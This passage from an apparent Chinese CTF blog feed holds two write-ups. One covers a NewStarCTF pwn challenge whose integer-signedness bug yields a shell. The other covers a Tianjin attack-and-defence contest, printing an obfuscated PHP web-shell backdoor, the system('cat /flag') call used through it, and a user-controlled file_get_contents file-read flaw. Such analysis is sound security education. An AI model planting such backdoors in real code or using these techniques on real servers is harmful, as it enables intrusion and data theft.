<span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>menu()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Go to the shop &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Make some money&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Don&#x27;t choose   &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>shop()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">shop</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===Welcome to newstar shop===&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.newstar&#x27;s gift          20$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.pwn write up            40$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.shell                 9999$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;All things are only available for one day!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to buy?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">3</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">3</span> )<br>    &#123;<br>LABEL_17:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nothing here&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money &gt; <span class="hljs-number">0x13</span> )<br>      &#123;<br>        money -= <span class="hljs-number">20</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You buy a newstar&#x27;s gift&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;That is the gift:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What will happen when int transfer to unsigned int?&quot;</span>);<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money &gt; <span class="hljs-number">0x27</span> )<br>      &#123;<br>        money -= <span class="hljs-number">40</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You buy a pwn write up&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;That is free after the match,haha&quot;</span>);<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);<br>LABEL_10:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money &gt; <span class="hljs-number">0x270E</span> )<br>  &#123;<br>    money = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How do you buy it?&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sorry,you don&#x27;t have enough money&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>makemoney()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">makemoney</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;==========Job list==========&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;============================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.McDonald part time job 20$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.MeiTuan takeout        40$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Giving out leaflets    60$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to do?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>  <span class="hljs-keyword">switch</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">if</span> ( hour &lt;= <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You chose McDonald&#x27;s part time job&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It took you 4hours and earned 20$&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      hour -= <span class="hljs-number">4</span>;<br>      money += <span class="hljs-number">20</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">if</span> ( hour &lt;= <span class="hljs-number">7</span> )<br>      &#123;<br>LABEL_12:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You need to rest&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>      &#125;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You chose MeiTuan takeout&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It took you 8hours and earned 40$&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      hour -= <span class="hljs-number">8</span>;<br>      money += <span class="hljs-number">40</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">if</span> ( hour &gt; <span class="hljs-number">11</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You chose giving out leaflets&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It took you 12hours and earned 60$&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        hour -= <span class="hljs-number">12</span>;<br>        money += <span class="hljs-number">60</span>;<br>        <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_12;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nothing here&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>dont_try()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">dont_try</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( chance )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You shouldn&#x27;t choose this&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please remember, the shop owner doesn&#x27;t like his secret to be found&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To punish your choice, you will lose 50$ and you will never be able to choose it!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    money -= <span class="hljs-number">50</span>;<br>    --chance;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>原理：有符号型负数int转化为无符号int会导致无符号int数值特别大</p><p>因此，先把所有money花光，之后去dont_try()函数减钱，将其变成负数，即可买到shell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为新生赛，还是比较简单的，对初学者比较友好。</p><p>贴一个官方wp：<a href="https://shimo.im/docs/XKq421EBKzFyRzAN/read">NewStarCTF 2023 Week1 官方WriteUp (shimo.im)</a></p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>reverse</tag>
      
      <tag>misc</tag>
      
      <tag>pwn</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天津市大学生信息安全网络攻防大赛</title>
    <link href="/2023/09/19/2023tianjindawd/"/>
    <url>/2023/09/19/2023tianjindawd/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中：</p><p>① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放；</p><p>② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。</p><h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>队伍名字 NKV</p><p>DAWD攻防赛排名第一</p><img src="/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png" class=""><p>应急响应排名第七</p><img src="/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png" class=""><p>总分第一</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>dawd的shop题目我们审计出了两个漏洞</p><p>第一个是在&#x2F;config&#x2F;config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>@<span class="hljs-variable">$_</span>++;<br><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&quot;`&quot;</span>^<span class="hljs-string">&quot;?&quot;</span>).(<span class="hljs-string">&quot;:&quot;</span>^<span class="hljs-string">&quot;&#125;&quot;</span>).(<span class="hljs-string">&quot;%&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;&#123;&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-variable">$___</span>=(<span class="hljs-string">&quot;$&quot;</span>^<span class="hljs-string">&quot;&#123;&quot;</span>).(<span class="hljs-string">&quot;~&quot;</span>^<span class="hljs-string">&quot;.&quot;</span>).(<span class="hljs-string">&quot;/&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;-&quot;</span>^<span class="hljs-string">&quot;~&quot;</span>).(<span class="hljs-string">&quot;(&quot;</span>^<span class="hljs-string">&quot;|&quot;</span>);<br><br>$&#123;<span class="hljs-variable">$__</span>&#125;[!<span class="hljs-variable">$_</span>]($&#123;<span class="hljs-variable">$___</span>&#125;[<span class="hljs-variable">$_</span>]);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一个明显的后门，相当于<code>$_GET[&#39;0&#39;]($_POST[&#39;1&#39;])</code></p><p>直接<code>system(&#39;cat /flag&#39;)</code>就行</p><p>另一个是在&#x2F;controller&#x2F;index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">indexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">medoo</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;yestoday&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;before&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;ASHOP&#x27;</span>;<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br><br><span class="hljs-variable">$user_data</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;ip&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;AshopToken&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user_data</span>)));<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>( <span class="hljs-variable">$datas</span> );<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;cat | ASHOP&#x27;</span>;<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] = <span class="hljs-variable">$catid</span>;<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>( <span class="hljs-variable">$datas</span> );<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>,<span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-1 day&#x27;</span>));<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>,<span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-2 day&#x27;</span>));<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_contents</span>( <span class="hljs-variable">$time</span> );<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>( <span class="hljs-variable">$data</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat_more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">cat_contents</span>( <span class="hljs-variable">$catid</span> );<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><span class="hljs-comment">//print_r($data);</span><br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>( <span class="hljs-variable">$data</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_pic</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$pic</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pic</span> != <span class="hljs-literal">null</span>)&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pic</span>);<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其中末尾处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_pic</span>(<span 